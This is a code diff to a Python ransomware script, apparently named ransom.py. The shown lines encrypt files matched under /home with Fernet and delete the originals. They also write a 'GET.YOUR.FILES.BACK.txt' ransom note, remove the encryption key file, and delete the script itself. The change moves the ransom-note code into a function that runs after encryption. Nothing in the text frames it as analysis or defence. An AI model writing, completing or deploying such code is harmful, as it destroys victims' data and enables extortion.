@@ -2,10 +2,12 @@ import glob
 from cryptography.fernet import Fernet
 import os
 import requests
-ransom_message = '''your message'''
-ransom_message_txt = open("GET.YOUR.FILES.BACK.txt", 'w')
-ransom_message_txt.write(ransom_message)
-ransom_message_txt.close()
+def ransom_message():
+    ransom_message = '''your message'''
+    ransom_message_txt = open("GET.YOUR.FILES.BACK.txt", 'w')
+    ransom_message_txt.write(ransom_message)
+    ransom_message_txt.close()
+
 session = requests.session()
 url = ('')
 response = session.get(url, allow_redirects=True)
@@ -135,6 +137,7 @@ for filename in glob.iglob('/home/**/*.js', recursive=True):
     with open(filename + '.enc', 'wb') as encrypted_file:
         encrypted_file.write(encrypted)
         os.remove(filename)
+ransom_message()
 os.remove('mykey.key')
 os.remove('ransom.py')
 
